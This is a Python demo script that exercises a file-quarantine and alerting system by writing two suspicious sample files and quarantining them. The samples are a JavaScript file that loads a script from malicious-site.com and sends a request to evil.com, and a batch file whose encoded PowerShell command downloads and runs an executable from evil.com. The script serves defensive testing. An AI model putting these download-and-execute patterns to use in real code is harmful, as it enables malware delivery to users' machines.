#!/usr/bin/env python3
"""
Demo script to test the quarantine system with a real file
"""

import os
import tempfile
import shutil
from datetime import datetime

# Import the quarantine functions
from app import (
    quarantine_file_internal,
    create_alert,
    determine_file_risk,
    determine_alert_severity,
    AlertSeverity,
    load_quarantine_db
)

def create_test_malware_file():
    """Create a test file that would be detected as malicious"""
    # Create a temporary file with suspicious content
    with tempfile.NamedTemporaryFile(mode='w', suffix='.js', delete=False) as f:
        f.write("""
// Suspicious JavaScript file for testing
eval(unescape('%61%6C%65%72%74%28%22%48%65%6C%6C%6F%20%57%6F%72%6C%64%22%29'));
document.write('<script src="http://malicious-site.com/script.js"></script>');
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://evil.com/download', true);
xhr.send();
        """)
        return f.name

def create_test_executable():
    """Create a test executable file"""
    # Create a simple batch file that would be flagged
    with tempfile.NamedTemporaryFile(mode='w', suffix='.bat', delete=False) as f:
        f.write("""
@echo off
REM Suspicious batch file for testing
powershell -enc "JAB3AGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAZABvAHcAbgBsAG8AYQBkACAAPQAgACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AbQBhAGwAdwBhAHIAZQAuAGUAeABlACIALAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABtAGEAbAB3AGEAcgBlAC4AZQB4AGUAIgApADsASQBuAHYAbwBrAGUALQBJAHQAZQBtACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAG0AYQBsAHcAYQByAGUALgBlAHgAZQAiAA=="
        """)
        return f.name

def demo_quarantine_system():
    """Demonstrate the quarantine system with real files"""
    
    print("🧪 Quarantine System Demo")
    print("=" * 50)
    
    # Create test files
    print("\n1. Creating test files...")
    test_js_file = create_test_malware_file()
    test_bat_file = create_test_executable()
    
    print(f"   Created test JS file: {test_js_file}")
    print(f"   Created test BAT file: {test_bat_file}")
    
    # Test 1: Quarantine JavaScript file
    print("\n2. Testing JavaScript file quarantine:")
    print("-" * 40)
    
    js_threat = {
        "path": test_js_file,
        "threat": "Suspicious JavaScript with obfuscated code",
        "score": 85,
        "details": {
            "detection_type": "heuristic",
            "patterns": ["eval", "unescape", "malicious-site.com"]
        }
    }
    
    print(f"   Threat Score: {js_threat['score']}/100")
    print(f"   Threat Type: {js_threat['threat']}")
    
    # Quarantine the file
    js_quarantine_record = quarantine_file_internal(test_js_file, js_threat)
    
    if js_quarantine_record:
        print(f"   ✅ File quarantined successfully!")
        print(f"   Quarantine ID: {js_quarantine_record['id']}")
        print(f"   Risk Level: {js_quarantine_record['risk_level']}")
        print(f"   File Type: {js_quarantine_record['file_type']}")
    else:
        print(f"   ❌ Failed to quarantine file")
    
    # Test 2: Quarantine Batch file
    print("\n3. Testing Batch file quarantine:")
    print("-" * 40)
    
    bat_threat = {
        "path": test_bat_file,
        "threat": "Suspicious batch file with PowerShell execution",
        "score": 90,
        "details": {
            "detection_type": "signature",
            "patterns": ["powershell", "-enc", "base64"]
        }
    }
    
    print(f"   Threat Score: {bat_threat['score']}/100")
    print(f"   Threat Type: {bat_threat['threat']}")
    
    # Quarantine the file
    bat_quarantine_record = quarantine_file_internal(test_bat_file, bat_threat)
    
    if bat_quarantine_record:
        print(f"   ✅ File quarantined successfully!")
        print(f"   Quarantine ID: {bat_quarantine_record['id']}")
        print(f"   Risk Level: {bat_quarantine_record['risk_level']}")
        print(f"   File Type: {bat_quarantine_record['file_type']}")
    else:
        print(f"   ❌ Failed to quarantine file")
    
    # Test 3: Check quarantine database
    print("\n4. Checking quarantine database:")
    print("-" * 40)
    
    quarantine_db = load_quarantine_db()
    print(f"   Total quarantined files: {len(quarantine_db)}")
    
    for i, record in enumerate(quarantine_db):
        print(f"   {i+1}. {record['filename']} - Score: {record['threat_score']} - Risk: {record['risk_level']}")
    
    # Test 4: Create manual alert
    print("\n5. Creating manual alert:")
    print("-" * 40)
    
    manual_alert = create_alert(
        AlertSeverity.HIGH,
        "🚨 Demo Alert: Test Threat Detected",
        "This is a test alert to demonstrate the alert system functionality.",
        {
            "filename": "demo_test.js",
            "file_type": "Script",
            "threat_score": 85,
            "threat_type": "Demo threat",
            "note": "This is a demonstration alert"
        }
    )
    
    print(f"   Alert created: {manual_alert['title']}")
    print(f"   Alert ID: {manual_alert['id']}")
    print(f"   Severity: {manual_alert['severity']}")
    
    # Cleanup
    print("\n6. Cleanup:")
    print("-" * 40)
    
    # Note: We don't delete the quarantined files as they're now in quarantine
    # The original test files should be moved to quarantine
    
    print("   Test files have been moved to quarantine directory")
    print("   To restore them, use the quarantine management interface")
    
    print("\n✅ Quarantine System Demo Completed!")
    print("\n📋 What happened:")
    print("   • Test files were created with suspicious content")
    print("   • Files were automatically quarantined due to high threat scores")
    print("   • Alerts were generated and stored in the system")
    print("   • Files are now safely isolated in the quarantine directory")
    
    print("\n🔍 Next steps:")
    print("   • Check the Quarantine page in the web interface")
    print("   • Review the alerts in the Alerts section")
    print("   • Try restoring or deleting the quarantined files")
    print("   • Monitor the real-time notifications")

if __name__ == "__main__":
    demo_quarantine_system() 